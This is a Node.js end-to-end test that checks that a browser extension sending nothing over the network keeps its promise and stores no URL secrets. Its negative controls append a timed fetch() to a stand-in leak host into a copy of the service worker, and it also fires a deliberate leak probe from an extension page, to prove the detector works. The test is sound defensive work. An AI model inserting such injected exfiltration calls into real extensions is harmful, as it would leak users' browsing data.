#!/usr/bin/env node
// Runtime no-egress test (DESIGN sections 4.4 and 10).
//
// Launches Playwright's bundled Chromium (no download: uses the cached revision) with the
// unpacked dist/ loaded, headless, with EVERY hostname resolved to a local fixture server
// (--host-resolver-rules). Any network request the extension made would therefore land on
// the fixture server and also show up as a CDP Network event on the extension's
// service-worker or page targets. The test browses fixture pages carrying canary strings,
// then asserts:
//   1. zero CDP network events from any chrome-extension:// target;
//   2. the fixture server saw only the page loads this test made;
//   3. the extension recorded the fixture hosts, and no canary reached chrome.storage.
// Negative controls rebuild dist/ into temp dirs with a fetch() injected into the worker:
//   A. CSP intact  -> the fetch must be blocked (server sees nothing) and the CDP guard
//                     must still see the attempt (so assertion 1 would fail);
//   B. CSP removed -> the fixture server must receive the leak (proves the detector works).
import { spawn } from 'node:child_process';
import { cpSync, existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { chromium } from 'playwright';

const root = resolve(import.meta.dirname, '../..');
const dist = resolve(root, 'dist');
/** Every Chromium this test starts dies with it, even on a crash or Ctrl-C. */
const live = new Set();
const killAll = () => {
  for (const p of live) if (p.exitCode === null) p.kill('SIGKILL');
};
process.on('exit', killAll);
for (const sig of ['SIGINT', 'SIGTERM']) process.on(sig, () => process.exit(130));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const results = [];
const check = (name, ok, detail = '') => {
  results.push({ name, ok });
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? `  (${detail})` : ''}`);
};

function startFixtureServer() {
  const hits = [];
  const server = createServer((req, res) => {
    hits.push({ host: req.headers.host ?? '', path: req.url ?? '', ua: req.headers['user-agent'] ?? '' });
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end('<!doctype html><title>CANARYTITLE fixture</title><h1>fixture</h1>');
  });
  return new Promise((ok) => server.listen(0, '127.0.0.1', () => ok({ server, hits, port: server.address().port })));
}

class Cdp {
  constructor(wsUrl) {
    this.ws = new WebSocket(wsUrl);
    this.id = 0;
    this.pending = new Map();
    this.listeners = [];
    this.ws.addEventListener('message', (e) => {
      const msg = JSON.parse(String(e.data));
      if (msg.id && this.pending.has(msg.id)) {
        const { ok, fail } = this.pending.get(msg.id);
        this.pending.delete(msg.id);
        if (msg.error) fail(new Error(JSON.stringify(msg.error)));
        else ok(msg.result);
      } else if (msg.method) for (const l of this.listeners) l(msg);
    });
  }
  open() {
    return new Promise((ok, fail) => {
      this.ws.addEventListener('open', ok, { once: true });
      this.ws.addEventListener('error', fail, { once: true });
    });
  }
  send(method, params = {}, sessionId) {
    const id = ++this.id;
    this.ws.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
    return new Promise((ok, fail) => this.pending.set(id, { ok, fail }));
  }
  on(fn) {
    this.listeners.push(fn);
  }
  close() {
    this.ws.close();
  }
}

async function launch(extDir, port) {
  const userDataDir = mkdtempSync(join(tmpdir(), 'saas-scan-e2e-profile-'));
  const proc = spawn(
    chromium.executablePath(),
    [
      '--headless=new',
      '--use-mock-keychain',
      '--password-store=basic',
      '--remote-debugging-port=0',
      `--user-data-dir=${userDataDir}`,
      `--disable-extensions-except=${extDir}`,
      `--load-extension=${extDir}`,
      `--host-resolver-rules=MAP * 127.0.0.1:${port}`,
      '--no-first-run',
      '--no-default-browser-check',
      '--disable-background-networking',
      '--disable-component-update',
      '--disable-sync',
      '--disable-features=Translate,OptimizationHints,MediaRouter,NetworkTimeServiceQuerying,DisableLoadExtensionCommandLineSwitch',
      '--enable-logging=stderr',
      'about:blank',
    ],
    { stdio: ['ignore', 'ignore', 'pipe'] },
  );
  live.add(proc);
  proc.once('exit', () => live.delete(proc));
  const kill = () => {
    if (proc.exitCode === null) proc.kill('SIGKILL');
    rmSync(userDataDir, { recursive: true, force: true });
  };
  const wsUrl = await new Promise((ok, fail) => {
    let buf = '';
    const t = setTimeout(() => fail(new Error(`no DevTools endpoint; stderr: ${buf.slice(-500)}`)), 20_000);
    proc.stderr.on('data', (d) => {
      buf += d;
      const m = buf.match(/DevTools listening on (ws:\/\/\S+)/);
      if (m) {
        clearTimeout(t);
        ok(m[1]);
      }
    });
    proc.on('exit', (code) => fail(new Error(`chromium exited ${code}: ${buf.slice(-500)}`)));
  }).catch((e) => {
    kill();
    throw e;
  });
  const cdp = new Cdp(wsUrl);
  await cdp.open().catch((e) => {
    kill();
    throw e;
  });
  const stop = async () => {
    try {
      cdp.close();
    } catch {}
    proc.kill('SIGTERM');
    await Promise.race([new Promise((r) => proc.once('exit', r)), sleep(5_000)]);
    if (proc.exitCode === null) proc.kill('SIGKILL');
    rmSync(userDataDir, { recursive: true, force: true });
  };
  return { cdp, stop };
}

/** Attach to every target, enable Network on it, and record requests by target URL. */
async function instrument(cdp) {
  const sessions = new Map(); // sessionId -> {type, url}
  const netEvents = []; // {type, targetUrl, requestUrl, blocked?}
  const attempts = []; // CSP-blocked connection attempts: never become Network requests
  cdp.on((msg) => {
    if (msg.method === 'Target.attachedToTarget') {
      const { sessionId, targetInfo } = msg.params;
      sessions.set(sessionId, { type: targetInfo.type, url: targetInfo.url, targetId: targetInfo.targetId });
      void cdp.send('Network.enable', {}, sessionId).catch(() => {});
      void cdp.send('Log.enable', {}, sessionId).catch(() => {});
      void cdp.send('Audits.enable', {}, sessionId).catch(() => {});
      void cdp.send('Runtime.runIfWaitingForDebugger', {}, sessionId).catch(() => {});
    }
    if (msg.method === 'Target.targetInfoChanged') {
      for (const s of sessions.values()) if (s.targetId === msg.params.targetInfo.targetId) s.url = msg.params.targetInfo.url;
    }
    if (msg.sessionId && msg.method === 'Network.requestWillBeSent') {
      const s = sessions.get(msg.sessionId) ?? { type: '?', url: '?' };
      netEvents.push({ type: s.type, targetUrl: s.url, requestUrl: msg.params.request.url });
    }
    if (msg.sessionId && msg.method === 'Log.entryAdded' && /Content Security Policy|Refused to connect/i.test(msg.params.entry.text)) {
      const s = sessions.get(msg.sessionId) ?? { type: '?', url: '?' };
      attempts.push({ type: s.type, targetUrl: s.url, text: msg.params.entry.text.slice(0, 160) });
    }
    if (msg.sessionId && msg.method === 'Audits.issueAdded' && msg.params.issue.code === 'ContentSecurityPolicyIssue') {
      const s = sessions.get(msg.sessionId) ?? { type: '?', url: '?' };
      attempts.push({ type: s.type, targetUrl: s.url, text: `CSP issue: ${msg.params.issue.details?.contentSecurityPolicyIssueDetails?.blockedURL ?? ''}` });
    }
    if (msg.sessionId && msg.method === 'Network.loadingFailed') {
      const s = sessions.get(msg.sessionId) ?? { type: '?', url: '?' };
      netEvents.push({ type: s.type, targetUrl: s.url, requestUrl: '(failed)', blocked: msg.params.blockedReason ?? msg.params.errorText });
    }
  });
  await cdp.send('Target.setDiscoverTargets', { discover: true });
  await cdp.send('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: false, flatten: true });
  const attached = new Set();
  const attachAll = async () => {
    const { targetInfos } = await cdp.send('Target.getTargets');
    for (const t of targetInfos) {
      if (attached.has(t.targetId)) continue;
      attached.add(t.targetId);
      await cdp.send('Target.attachToTarget', { targetId: t.targetId, flatten: true }).catch(() => {});
    }
    return targetInfos;
  };
  return { sessions, netEvents, attempts, attachAll };
}

/** A request that could leave the machine: anything except the extension's own package files. */
const isNetwork = (e) => e.requestUrl !== '(failed)' && !/^(chrome-extension|data|blob):/.test(e.requestUrl);
const fromExtension = (e) => e.targetUrl.startsWith('chrome-extension://');

async function waitForWorker(attachAll) {
  for (let i = 0; i < 50; i++) {
    const targets = await attachAll();
    // Match OUR worker (background.js), not a built-in component extension.
    const sw = targets.find((t) => t.type === 'service_worker' && /^chrome-extension:\/\/[a-p]{32}\/background\.js$/.test(t.url));
    if (sw) return new URL(sw.url).host;
    await sleep(200);
  }
  throw new Error('extension service worker never appeared');
}

async function evalIn(cdp, sessionId, expression) {
  const r = await cdp.send('Runtime.evaluate', { expression, awaitPromise: true, returnByValue: true }, sessionId);
  if (r.exceptionDetails) throw new Error(JSON.stringify(r.exceptionDetails));
  return r.result.value;
}

async function mainRun(port, fixture) {
  const { cdp, stop } = await launch(dist, port);
  try {
    const inst = await instrument(cdp);
    const extId = await waitForWorker(inst.attachAll);
    // Browse fixture hosts in one tab, as a user would.
    const { targetId } = await cdp.send('Target.createTarget', { url: 'about:blank' });
    const { sessionId } = await cdp.send('Target.attachToTarget', { targetId, flatten: true });
    await cdp.send('Page.enable', {}, sessionId);
    const pages = [
      `http://user:CANARYPW@acme.slack.com:${port}/CANARYPATH/login?token=CANARYQ#CANARYF`,
      `http://chatgpt.com:${port}/c/CANARYPATH2?q=CANARYQ2`,
      `http://app.newtool.io:${port}/sso/start?email=CANARYQ3`,
    ];
    for (const url of pages) {
      await cdp.send('Page.navigate', { url }, sessionId);
      await sleep(2_500);
    }
    await sleep(1_000);
    // Open the report and popup pages from inside the extension (chrome.tabs.create in the
    // service worker), exactly as the popup's "Open full report" button does.
    const swSession = [...inst.sessions.entries()].find(([, v]) => v.type === 'service_worker' && v.url.startsWith(`chrome-extension://${extId}`))?.[0];
    if (!swSession) throw new Error('no CDP session on the extension service worker');
    const loadedName = await evalIn(cdp, swSession, `chrome.runtime.getManifest().name`);
    const ourName = JSON.parse(readFileSync(resolve(dist, 'manifest.json'), 'utf8')).name;
    if (loadedName !== ourName) throw new Error(`attached to the wrong extension: ${loadedName}`);
    await evalIn(cdp, swSession, `chrome.tabs.create({ url: 'report.html' }).then(() => 1)`);
    await evalIn(cdp, swSession, `chrome.tabs.create({ url: 'popup.html' }).then(() => 1)`);
    await sleep(2_500);
    const targets = await inst.attachAll();
    const rep = targets.find((t) => t.url === `chrome-extension://${extId}/report.html`);
    const popup = targets.find((t) => t.url === `chrome-extension://${extId}/popup.html`);
    if (!rep || !popup) throw new Error(`extension pages did not open: ${targets.map((t) => t.url).join(', ')}`);
    const repSession = [...inst.sessions.entries()].find(([, v]) => v.url === rep.url)?.[0] ?? (await cdp.send('Target.attachToTarget', { targetId: rep.targetId, flatten: true })).sessionId;
    await sleep(1_000);
    await inst.attachAll();
    const where = await evalIn(cdp, repSession, `location.href`);
    if (!where.startsWith("chrome-extension://")) throw new Error(`report tab is at ${where}, extension ${extId}: ${(await evalIn(cdp, repSession, "document.body.innerText")).slice(0, 300)}`);
    const flushed = await evalIn(cdp, repSession, `chrome.runtime.sendMessage({type:'flush'})`);
    const local = await evalIn(cdp, repSession, `chrome.storage.local.get(null)`);
    const session = await evalIn(cdp, repSession, `chrome.storage.session.get(null).catch(e => ({error: String(e)}))`);
    const reportText = await evalIn(cdp, repSession, `document.body.innerText`);
    const popupSession = [...inst.sessions.entries()].find(([, v]) => v.url === popup.url)?.[0];
    const popupText = popupSession ? await evalIn(cdp, popupSession, `document.body.innerText`) : '';
    await sleep(500);

    await sleep(1_000);
    const extRequests = inst.netEvents.filter((e) => fromExtension(e) && isNetwork(e));
    const extAttempts = inst.attempts.filter(fromExtension);
    const packageLoads = inst.netEvents.filter((e) => fromExtension(e) && !isNetwork(e) && e.requestUrl !== '(failed)').length;
    check('extension service worker loaded under the strict CSP', Boolean(extId), extId);
    check('CDP instrumentation saw the extension\'s own package loads (it is attached)', packageLoads > 0, `${packageLoads} chrome-extension:// loads`);
    check('zero network requests from extension targets during browsing', extRequests.length === 0, `${extRequests.length} events ${JSON.stringify(extRequests.slice(0, 2))}`);
    check('zero blocked egress attempts from extension targets during browsing', extAttempts.length === 0, `${extAttempts.length} ${JSON.stringify(extAttempts.slice(0, 2))}`);
    // A deliberate fetch from an extension page must be blocked by CSP.
    const pageFetch = await evalIn(
      cdp,
      repSession,
      `fetch('http://leak-page.example.com:${port}/leak-from-page').then(() => 'SENT', (e) => 'BLOCKED: ' + e.message)`,
    );

    const unexpected = fixture.hits.filter((h) => !/^(acme\.slack\.com|chatgpt\.com|app\.newtool\.io):/.test(h.host));
    check('fixture server saw only the test page loads', unexpected.length === 0, `${fixture.hits.length} hits, unexpected: ${JSON.stringify(unexpected.map((h) => h.host + h.path))}`);
    check('deliberate fetch from an extension page is blocked by CSP', pageFetch.startsWith('BLOCKED'), pageFetch);
    check('blocked probe did not reach the fixture server', !fixture.hits.some((h) => h.path.includes('leak-from-page')));
    await sleep(1_000);
    const probeSeen = inst.attempts.filter(fromExtension).some((a) => a.text.includes('leak-page'));
    check('guard observed the CSP-blocked probe as an egress attempt', probeSeen, JSON.stringify(inst.attempts.filter(fromExtension).slice(0, 2)));
    check('flush message accepted', flushed?.ok === true, JSON.stringify(flushed));

    const dump = JSON.stringify({ local, session }).toLowerCase();
    const recorded = ['acme.slack.com', 'chatgpt.com', 'app.newtool.io'].filter((h) => dump.includes(h));
    check('extension recorded the browsed fixture hosts', recorded.length === 3, `recorded: ${recorded.join(', ')}; keys: ${Object.keys(local).join(', ')}`);
    const leaked = ['canarypw', 'canarypath', 'canaryq', 'canaryf', 'canarytitle', 'token=', 'email='].filter((c) => dump.includes(c));
    check('no canary (path/query/fragment/userinfo/title) in chrome.storage', leaked.length === 0, leaked.join(','));
    check('login hint recorded for the /login and /sso pages', local['d:' + new Date().toLocaleDateString('en-CA')]?.['app.newtool.io']?.loginHint === 1);
    check('report page rendered from local data', /AI tools \(1\)/.test(reportText) && reportText.includes('ChatGPT'), reportText.slice(0, 120).replace(/\n/g, ' '));
    check('popup rendered', /known apps/.test(popupText), popupText.slice(0, 80).replace(/\n/g, ' '));
  } finally {
    await stop();
  }
}

function variant(name, { keepCsp }) {
  const dir = mkdtempSync(join(tmpdir(), `saas-scan-e2e-${name}-`));
  cpSync(dist, dir, { recursive: true });
  return { dir, keepCsp };
}

async function negativeControl(label, keepCsp, port, fixture) {
  const { dir } = variant(label, { keepCsp });
  const leakPath = `/leak-from-sw-${label}`;
  // Injected into a COPY of dist only. The shipped build never contains this.
  const injected = `\n;setInterval(() => { fetch('http://leak.example.com:${port}${leakPath}').catch(() => {}); }, 500);\n`;
  writeFileSync(join(dir, 'background.js'), readFileSync(join(dir, 'background.js'), 'utf8') + injected);
  if (!keepCsp) {
    const m = JSON.parse(readFileSync(join(dir, 'manifest.json'), 'utf8'));
    delete m.content_security_policy;
    writeFileSync(join(dir, 'manifest.json'), JSON.stringify(m));
  }
  const { cdp, stop } = await launch(dir, port);
  try {
    const inst = await instrument(cdp);
    await waitForWorker(inst.attachAll);
    await sleep(4_000);
    const reached = fixture.hits.some((h) => h.path === leakPath);
    const requests = inst.netEvents.filter((e) => e.type === 'service_worker' && isNetwork(e) && e.requestUrl.includes(leakPath));
    const attempts = inst.attempts.filter((a) => a.type === 'service_worker' && a.text.includes(leakPath));
    return { reached, requests, attempts };
  } finally {
    await stop();
    rmSync(dir, { recursive: true, force: true });
  }
}

async function main() {
  if (!existsSync(resolve(dist, 'manifest.json'))) {
    console.error('dist/ not built; run npm run build first');
    process.exit(2);
  }
  if (!existsSync(chromium.executablePath())) {
    console.error(`Playwright Chromium not found at ${chromium.executablePath()} (this test never downloads it)`);
    process.exit(2);
  }
  const fixture = await startFixtureServer();
  try {
    await mainRun(fixture.port, fixture);
    const a = await negativeControl('csp', true, fixture.port, fixture);
    check('negative control A (CSP intact): injected worker fetch never reaches the network', !a.reached);
    check('negative control A (CSP intact): no network request was created', a.requests.length === 0, `${a.requests.length}`);
    check('negative control A (CSP intact): the zero-attempt assertion FAILS on it (guard sees the violation)', a.attempts.length > 0, `${a.attempts.length} attempts, e.g. ${JSON.stringify(a.attempts[0]?.text ?? null)}`);
    const b = await negativeControl('nocsp', false, fixture.port, fixture);
    check('negative control B (CSP removed): leak reaches the fixture server (detector works)', b.reached);
    check('negative control B (CSP removed): the zero-request assertion FAILS on it (CDP sees the leak)', b.requests.length > 0, `${b.requests.length} SW network events`);
  } finally {
    fixture.server.close();
  }
  const failed = results.filter((r) => !r.ok);
  console.log(`\n${results.length - failed.length}/${results.length} checks passed`);
  process.exit(failed.length ? 1 : 0);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
